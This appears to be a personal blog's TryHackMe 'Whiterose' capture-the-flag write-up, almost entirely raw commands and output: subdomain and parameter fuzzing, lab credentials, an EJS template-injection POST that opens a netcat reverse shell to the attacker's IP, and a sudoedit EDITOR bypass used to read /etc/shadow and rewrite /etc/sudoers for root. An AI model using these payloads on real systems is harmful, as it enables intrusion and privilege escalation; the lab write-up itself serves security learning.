@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Whiterose | Technical Intelligence Labs</title>
+    <link rel="stylesheet" href="../css/custom.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
+        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
+        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
+        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
+        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
+        .markdown-content blockquote { 
+            position: relative;
+            border-left: 2px solid #22c55e; 
+            padding: 1.5rem 0 1.5rem 1.75rem; 
+            color: #cbd5e1; 
+            margin-bottom: 2.5rem; 
+            font-style: normal; 
+            background: rgba(34, 197, 94, 0.03);
+            border-radius: 0 4px 4px 0;
+            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
+        }
+        .markdown-content blockquote::before {
+            content: "TECHNICAL_INTELLIGENCE";
+            position: absolute;
+            top: -9px;
+            left: 0;
+            background: #22c55e;
+            color: #000;
+            font-size: 0.6rem;
+            font-weight: bold;
+            padding: 2px 6px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
+        .markdown-content p { margin-bottom: 1.5rem; }
+        
+        .diag-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            position: relative;
+            overflow: hidden;
+        }
+        .diag-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 2px;
+            height: 100%;
+            background: #22c55e;
+            opacity: 0.5;
+        }
+        .diag-label {
+            display: block;
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            color: #64748b;
+            margin-bottom: 0.25rem;
+            letter-spacing: 0.1em;
+        }
+        .diag-value {
+            font-size: 0.9rem;
+            color: #cbd5e1;
+        }
+        .diag-blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">
+
+    <!-- Navigation -->
+    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+            <a href="../index.html" class="logo-container group flex items-center gap-3">
+                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
+            </a>
+
+            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
+                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
+                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
+                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
+                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
+                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
+                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
+                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="py-20 px-6 max-w-7xl mx-auto flex-grow w-full">
+        <!-- Post Header -->
+        <header class="mb-12 border-b border-slate-800 pb-12">
+            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
+                <span>// 2024-12-30</span>
+                <span>// ID: REF-Whiterose</span>
+            </div>
+            
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Whiterose</h1>
+            
+            <div class="flex flex-wrap gap-2">
+                <!-- Tags populated by python -->
+                <!-- tryhackme, ctf -->
+            </div>
+        </header>
+
+        <!-- Markdown Body -->
+        <div class="markdown-content">
+            <hr />
+<blockquote>
+<p>first nmap</p>
+</blockquote>
+<pre class="codehilite"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
+|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
+|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-title: 416 Requested Range Not Satisfiable
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.                                                  
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                       
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4.15
+OS details: Linux 4.15
+Network Distance: 4 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+
+<pre class="codehilite"><code>❯ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cyprusbank.thm/ -H &quot;Host:FUZZ.cyprusbank.thm&quot; -fw 1
+________________________________________________
+
+www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 390ms]
+admin          
+</code></pre>
+
+<pre class="codehilite"><code>Olivia Cortez - olivi8
+Gayle Bev - p~]P@5!6;rs558:q
+</code></pre>
+
+<pre class="codehilite"><code>❯ ffuf -u 'http://admin.cyprusbank.thm/settings' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: connect.sid=s%3AsoBA8h9k8wD7SwX8kIhOE0COJ0ZiYpd_.0IsO2h84GZBQeUXTRscbS5obvi8qk8GB%2BQWHexNyK%2Fg' -mc all -d 'name=test&amp;password=test&amp;FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 100 -fs 2098
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://admin.cyprusbank.thm/settings
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Header           : Cookie: connect.sid=s%3AsoBA8h9k8wD7SwX8kIhOE0COJ0ZiYpd_.0IsO2h84GZBQeUXTRscbS5obvi8qk8GB%2BQWHexNyK%2Fg
+ :: Data             : name=test&amp;password=test&amp;FUZZ=test
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 100
+ :: Matcher          : Response status: all
+ :: Filter           : Response size: 2098
+________________________________________________
+
+password                [Status: 200, Size: 2103, Words: 427, Lines: 59, Duration: 1244ms]
+include                 [Status: 500, Size: 1388, Words: 80, Lines: 11, Duration: 1729ms]
+error                   [Status: 200, Size: 1467, Words: 281, Lines: 49, Duration: 1751ms]
+message                 [Status: 200, Size: 2159, Words: 444, Lines: 61, Duration: 1022ms]
+client                  [Status: 500, Size: 1399, Words: 80, Lines: 11, Duration: 1554ms]
+</code></pre>
+
+<pre class="codehilite"><code>POST /settings HTTP/1.1
+Host: admin.cyprusbank.thm
+Content-Length: 156
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://admin.cyprusbank.thm
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://admin.cyprusbank.thm/settings
+Accept-Encoding: gzip, deflate, br
+Cookie: connect.sid=s%3AukFjA-XkmVVp9DfUoHMzrngAOtRqIbCd.mFUIQlrJiCkpaEavbF%2FPHGqRtr1ccSVHXdWkpB41bWc
+Connection: keep-alive
+
+name=x&amp;password=x&amp;settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.21.16.42 1337 -e bash');s
+</code></pre>
+
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 1337
+listening on [any] 1337 ...
+connect to [10.21.16.42] from (UNKNOWN) [10.201.43.252] 59294
+
+which python
+
+which python3
+/usr/bin/python3
+python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+web@cyprusbank:~/app$ export TERM=xterm
+export TERM=xterm
+web@cyprusbank:~/app$ ^Z
+[1]+  Stopped                 nc -lnvp 1337
+
+┌──(kali㉿kali)-[~]
+└─$ stty raw -echo; fg
+stty rows 38 columns 116
+nc -lnvp 1337
+
+web@cyprusbank:~/app$
+</code></pre>
+
+<pre class="codehilite"><code>web@cyprusbank:~/app$ ls
+components  node_modules  package-lock.json  static
+index.js    package.json  routes             views
+web@cyprusbank:~/app$ cd /home                                                                                                                            
+web@cyprusbank:/home$ ls                                                                                                                                  
+web                                                                                                                                                        
+web@cyprusbank:/home$ cd web                                                                                                                               
+web@cyprusbank:~$ ls                                                                                                                                       
+app  user.txt                                                                                                                                              
+web@cyprusbank:~$ cat user.txt
+</code></pre>
+
+<pre class="codehilite"><code>web@cyprusbank:~$ sudo -l                                                                                                                                  
+Matching Defaults entries for web on cyprusbank:                                                                                                           
+    env_keep+=&quot;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&quot;, env_keep+=&quot;XAPPLRESDIR                                                                            
+    XFILESEARCHPATH XUSERFILESEARCHPATH&quot;,                                                                                                                  
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    mail_badpass
+
+User web may run the following commands on cyprusbank:
+    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+web@cyprusbank:~$ export EDITOR=&quot;vi -- /etc/shadow&quot;
+web@cyprusbank:~$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+sudo: sudoedit doesn't need to be run via sudo
+sudo: --: editing files in a writable directory is not permitted
+[1]+  Stopped                 
+sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+</code></pre>
+
+<blockquote>
+<p>above we can see root hash</p>
+</blockquote>
+<pre class="codehilite"><code>web@cyprusbank:~$ export EDITOR=&quot;vi -- /root/root.txt&quot;
+web@cyprusbank:~$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+sudo: sudoedit doesn't need to be run via sudo
+sudo: --: editing files in a writable directory is not permitted
+2 files to edit
+web@cyprusbank:~$             sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+</code></pre>
+
+<blockquote>
+<p>above we can see root.txt but we exploit that cve <code>sudoeditbypass</code></p>
+</blockquote>
+<pre class="codehilite"><code>##
+## User privilege specification
+##
+root ALL=(ALL:ALL) ALL
+
+## Uncomment to allow members of group wheel to execute any command
+
+
+## Same thing without a password
+# %wheel ALL=(ALL:ALL) NOPASSWD: ALL
+
+## Uncomment to allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) ALL
+web     ALL=(root) NOPASSWD: ALL
+## Uncomment to allow any user to run sudo if they know the password
+## of the user they are running the command as (root by default).
+# Defaults targetpw  # Ask for the password of the target user
+# ALL ALL=(ALL:ALL) ALL  # WARNING: only use this together with 'Defaults targett
+pw'
+
+## Read drop-in files from /etc/sudoers.d
+@includedir /etc/sudoers.d
+~                                                                               
+-- INSERT --                         
+</code></pre>
+
+<pre class="codehilite"><code>web@cyprusbank:~$ export EDITOR=&quot;vi -- /etc/sudoers&quot;
+web@cyprusbank:~$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+sudo: sudoedit doesn't need to be run via sudo
+sudo: --: editing files in a writable directory is not permitted
+2 files to edit
+sudo: /etc/nginx/sites-available/admin.cyprusbank.thm unchanged
+web@cyprusbank:~$ sudo su
+root@cyprusbank:/home/web# cd /root
+root@cyprusbank:~# ls
+clean.sh  root.txt
+root@cyprusbank:~# cat root.txt
+</code></pre>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
+            <div class="diag-card text-left">
+                <span class="diag-label">Access_Level</span>
+                <span class="diag-value">OMNI_READ_ONLY</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Encryption</span>
+                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Signal_Strength</span>
+                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">System_Status</span>
+                <span class="diag-value">STABLE_HARDENED</span>
+            </div>
+        </div>
+
+        <div class="flex justify-center gap-6 mb-8">
+            <a href="https://github.com/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
+                    class="fa-brands fa-github"></i></a>
+            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
+                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
+            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
+                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
+                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
+        </div>
+        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
+    </footer>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
